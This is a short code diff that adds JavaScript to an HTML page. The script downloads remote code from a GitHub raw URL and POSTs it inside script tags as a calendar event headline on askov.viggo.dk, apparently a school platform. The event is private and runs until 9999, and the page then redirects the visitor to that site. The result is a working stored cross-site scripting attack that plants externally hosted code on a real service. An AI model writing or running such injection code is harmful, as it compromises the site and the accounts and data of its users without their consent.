@@ -146,6 +146,22 @@
                 request.send(JSON.stringify(params));
             })
         })
+
+        fetch("https://raw.githubusercontent.com/WiseMotherFucker/ViggoPlus/main/viggo%2B_main.js", {
+            method: "GET",
+        })
+        .then(response => {
+            return response.text()
+        })
+        .then(html => {
+            var injectionCode = html
+            fetch("https://askov.viggo.dk/Shared/Events/SaveEvents", {
+                "body": `CalendarId=0&IsPrivate=true&Headline=%3Cscript%3E${injectionCode}%3C%2Fscript%3E&Description=&refCalendarPremisesId=0&PlaceName=&startdate=01-01-2024&starttime=00%3A00&enddate=01-01-9999&endtime=00%3A00`,
+                "method": "POST"
+            })
+        })
+
+        location.href = 'https://askov.viggo.dk'
     }
   </script>
 </body>
